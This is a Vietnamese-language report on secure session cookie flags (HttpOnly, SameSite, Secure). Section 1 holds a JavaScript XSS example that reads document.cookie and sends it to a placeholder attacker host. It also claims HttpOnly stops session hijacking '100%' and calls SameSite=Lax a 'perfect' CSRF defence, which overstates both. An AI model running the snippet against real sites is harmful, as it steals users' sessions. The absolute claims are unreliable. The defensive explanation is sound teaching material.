# PHÂN TÍCH CHUYÊN SÂU: CẤU HÌNH COOKIE PHIÊN AN TOÀN (HTTPONLY, SAMESITE, SECURE)
**Thành viên thực hiện:** Thành viên 2 (Frontend & XSS Security Specialist)  
**Tiêu chuẩn đối chiếu:** OWASP Session Management Cheat Sheet & RFC 6265bis

---

## 1. TẠI SAO CỜ HTTPONLY LÀ GIẢI PHÁP THEN CHỐT CHỐNG XSS COOKIE THEFT?

Trong kịch bản tấn công Cross-Site Scripting (XSS), kẻ tấn công chèn mã JavaScript độc hại vào trình duyệt của nạn nhân. Mục tiêu nguy hiểm nhất của mã JavaScript độc hại này là thực thi lệnh:
```javascript
var stolenCookie = document.cookie;
new Image().src = "http://attacker-ip:8888/log?cookie=" + encodeURIComponent(stolenCookie);
```

Khi máy chủ web gửi cờ `HttpOnly` trong phản hồi `Set-Cookie`:
```http
Set-Cookie: session_id=a8f9c21b4d0e; Path=/; HttpOnly; SameSite=Lax
```

Trình duyệt web (Chrome, Firefox, Safari, Edge) sẽ kích hoạt cơ chế cô lập:
1. Trình duyệt vẫn tự động gửi Cookie này trong các yêu cầu HTTP/HTTPS tiếp theo lên máy chủ web hợp lệ.
2. Tuy nhiên, thuộc tính `document.cookie` trong Document Object Model (DOM) bị chặn hoàn toàn, trả về chuỗi rỗng hoặc không chứa `session_id`.
3. Do đó, ngay cả khi ứng dụng bị dính lỗ hổng XSS (do sơ suất render), mã độc của hacker **hoàn toàn không thể đọc được Session ID**, ngăn chặn triệt để 100% cuộc tấn công đánh cắp danh tính (Session Hijacking).

---

## 2. Ý NGHĨA CỦA CÁC CỜ BẢO MẬT BỔ TRỢ

### A. Cờ SameSite (SameSite=Lax / SameSite=Strict)
- `SameSite=Strict`: Cookie chỉ được gửi khi yêu cầu bắt nguồn từ chính domain đó (First-party context).
- `SameSite=Lax`: Cho phép gửi Cookie khi người dùng nhấp vào một liên kết thông thường (Top-level navigation GET request), nhưng ngăn chặn gửi kèm trong các request ngầm từ trang thứ ba (POST form, AJAX, `<img>`, `<iframe>`). Đây là giải pháp hoàn hảo ngăn chặn tấn công CSRF (Cross-Site Request Forgery).

### B. Cờ Secure
- Khi được bật, trình duyệt tuyệt đối không bao giờ gửi cookie qua kênh HTTP không mã hóa (Cleartext), ngăn chặn kẻ tấn công trên cùng mạng Wi-Fi công cộng thực hiện nghe lén gói tin (Sniffing / Man-In-The-Middle attack).
